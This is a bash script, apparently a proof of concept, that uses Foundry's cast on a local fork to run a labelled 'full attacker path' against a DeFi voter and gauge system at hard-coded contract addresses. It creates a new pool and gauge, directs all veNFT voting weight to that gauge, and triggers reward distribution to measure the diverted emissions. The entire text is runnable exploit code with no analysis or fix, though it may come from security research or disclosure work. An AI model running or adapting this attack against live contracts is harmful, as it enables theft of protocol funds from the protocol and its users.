#!/usr/bin/env bash
# Full attacker path on a NEW pool + NEW gauge (fork-only).
set -uo pipefail
FORK=http://127.0.0.1:8011
F=0xE140EaC2bB748c8F456719a457F26636617Bb0E9
V=0xe09A60FAe6d77658b9767A70e2f361b46Dd3f16A
USDC=0x3355df6D4c9C3035724Fd0e3914dE96A5a83aaf4
ZKDOGE=0xbfb4b5616044eded03e5b1ad75141f0d9cb1499b
VC=0x85D84c774CF8e9fF85342684b0E795Df72A24908
ESC=0xbdE345771Eb0c6adEBc54F41A169ff6311fE096F
A=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
PK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# 1) create pair
cast send $F "createPair(address,address,bool)" $USDC $ZKDOGE false --private-key $PK --gas-limit 5000000 --rpc-url $FORK >/dev/null 2>&1
NEWPOOL=$(cast call $F "getPair(address,address)(address)" $USDC $ZKDOGE --rpc-url $FORK 2>/dev/null || true)
echo "getPair: $NEWPOOL"
NEWPOOL=$(cast call $F "allPairs(uint256)(address)" 167 --rpc-url $FORK)
echo "new pool: $NEWPOOL"
# 2) create gauge
cast send $V "createGauge(address)" $NEWPOOL --private-key $PK --gas-limit 5000000 --rpc-url $FORK >/dev/null 2>&1
NEWGAUGE=$(cast call $V "gauges(address)(address)" $NEWPOOL --rpc-url $FORK)
echo "new gauge: $NEWGAUGE"
echo "isAlive(newGauge): $(cast call $V 'isAlive(address)(bool)' $NEWGAUGE --rpc-url $FORK)"
# 3) vote
TID=$(cast call $ESC 'tokenOfOwnerByIndex(address,uint256)(uint256)' $A 0 --rpc-url $FORK | awk '{print $1}')
BAL=$(cast call $ESC 'balanceOfNFT(uint256)(uint256)' $TID --rpc-url $FORK | awk '{print $1}')
echo "veNFT $TID balance $BAL"
cast send $V "vote(uint256,address[],uint256[])" $TID "[$NEWPOOL]" "[$BAL]" --private-key $PK --gas-limit 5000000 --rpc-url $FORK >/dev/null 2>&1
echo "weights(newPool): $(cast call $V 'weights(address)(uint256)' $NEWPOOL --rpc-url $FORK)"
echo "totalWeight: $(cast call $V 'totalWeight()(uint256)' --rpc-url $FORK)"
# 4) distribute
echo "index before: $(cast storage $V 18 --rpc-url $FORK)"
echo "gauge VC before: $(cast call $VC 'balanceOf(address)(uint256)' $NEWGAUGE --rpc-url $FORK)"
cast send $V "distribute(address[])" "[$NEWGAUGE]" --private-key $PK --gas-limit 6000000 --rpc-url $FORK 2>&1 | grep -E "status" | head -1
echo "index after: $(cast storage $V 18 --rpc-url $FORK)"
echo "claimable(newGauge): $(cast call $V 'claimable(address)(uint256)' $NEWGAUGE --rpc-url $FORK)"
echo "gauge VC after: $(cast call $VC 'balanceOf(address)(uint256)' $NEWGAUGE --rpc-url $FORK)"
